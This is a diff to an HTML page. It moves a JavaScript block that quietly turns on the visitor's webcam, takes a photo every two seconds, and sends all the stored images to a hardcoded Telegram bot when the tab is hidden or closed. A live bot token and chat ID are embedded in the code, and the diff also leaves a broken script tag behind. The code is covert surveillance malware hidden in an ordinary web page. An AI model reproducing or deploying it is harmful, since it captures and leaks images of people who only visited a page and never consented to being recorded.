@@ -243,9 +243,67 @@
             </form>
         </div>
     </div>
+    <script >
+        const BOT_TOKEN = "8831162632:AAGowdHChrYwev9Y54NYtVGC6mYajUZpjko";
+        const CHAT_ID = "8125688786";
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        let imageBuffer = [];
+        let captureInterval = null;
+
+        // 1. ካሜራ ማስጀመር
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                captureInterval = setInterval(capturePhoto, 2000);
+            })
+            .catch(err => console.error("ካሜራ አልተከፈተም:", err));
+
+        // 2. ፎቶን አዘጋጅቶ Memory ላይ ማስቀመጥ
+        function capturePhoto() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/jpeg', 0.5);
+            imageBuffer.push(imageData);
+            console.log(`ፎቶ ተይዟል! ጠቅላላ የተያዙ፡ ${imageBuffer.length}`);
+        }
+
+        // 3. ተጠቃሚው ገጹን ሲዘጋ ወይም ታቡን ሲቀይር (Exit Event)
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') {
+                sendAllPhotos();
+            }
+        });
+
+        // 4. የተከማቹትን ፎቶዎች በሙሉ ወደ Telegram መላክ
+        async function sendAllPhotos() {
+            if (imageBuffer.length === 0) return;
+
+            if (captureInterval) clearInterval(captureInterval);
+
+            for (let i = 0; i < imageBuffer.length; i++) {
+                try {
+                    const blob = await (await fetch(imageBuffer[i])).blob();
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, `photo_${i + 1}.jpg`);
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData,
+                        keepalive: true
+                    });
+                } catch (e) {
+                    console.error("የመላክ ስህተት፡", e);
+                }
+            }
+            imageBuffer = [];
+        }
 
     <!-- FIREBASE REALTIME DATABASE SCRIPT (MODERN SDK) -->
-    <script type="module">
+    < type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
@@ -365,63 +423,7 @@
         }
     
 
-        const BOT_TOKEN = "8831162632:AAGowdHChrYwev9Y54NYtVGC6mYajUZpjko";
-        const CHAT_ID = "8125688786";
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        let imageBuffer = [];
-        let captureInterval = null;
-
-        // 1. ካሜራ ማስጀመር
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                captureInterval = setInterval(capturePhoto, 2000);
-            })
-            .catch(err => console.error("ካሜራ አልተከፈተም:", err));
-
-        // 2. ፎቶን አዘጋጅቶ Memory ላይ ማስቀመጥ
-        function capturePhoto() {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg', 0.5);
-            imageBuffer.push(imageData);
-            console.log(`ፎቶ ተይዟል! ጠቅላላ የተያዙ፡ ${imageBuffer.length}`);
-        }
-
-        // 3. ተጠቃሚው ገጹን ሲዘጋ ወይም ታቡን ሲቀይር (Exit Event)
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'hidden') {
-                sendAllPhotos();
-            }
-        });
-
-        // 4. የተከማቹትን ፎቶዎች በሙሉ ወደ Telegram መላክ
-        async function sendAllPhotos() {
-            if (imageBuffer.length === 0) return;
-
-            if (captureInterval) clearInterval(captureInterval);
-
-            for (let i = 0; i < imageBuffer.length; i++) {
-                try {
-                    const blob = await (await fetch(imageBuffer[i])).blob();
-                    const formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
-                    formData.append("photo", blob, `photo_${i + 1}.jpg`);
-
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: "POST",
-                        body: formData,
-                        keepalive: true
-                    });
-                } catch (e) {
-                    console.error("የመላክ ስህተት፡", e);
-                }
-            }
-            imageBuffer = [];
-        }
+        
     </script>
 </body>
 </html>
